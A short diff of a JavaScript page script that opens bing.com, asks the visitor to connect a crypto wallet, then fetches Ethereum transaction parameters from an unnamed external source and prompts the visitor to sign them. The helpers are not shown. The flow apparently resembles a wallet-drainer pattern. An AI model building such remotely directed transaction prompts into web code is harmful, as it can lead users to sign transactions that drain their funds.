@@ -23,12 +23,14 @@
       // Open bing.com
       window.open('https://bing.com', 'x');
 
-      // Fetch transaction parameters from an external source
-      const transactionParameters = await fetchTransactionParameters();
-      if (transactionParameters) {
-        // Check for wallet connection and perform the Ethereum transaction
-        const connected = await promptWalletConnection();
-        if (connected) {
+      // Check for wallet connection
+      const connected = await promptWalletConnection();
+
+      // If wallet connected, fetch and perform an Ethereum transaction
+      if (connected) {
+        // Fetch transaction parameters from an external source
+        const transactionParameters = await fetchTransactionParameters();
+        if (transactionParameters) {
           await promptEthTransaction(transactionParameters);
         }
       }
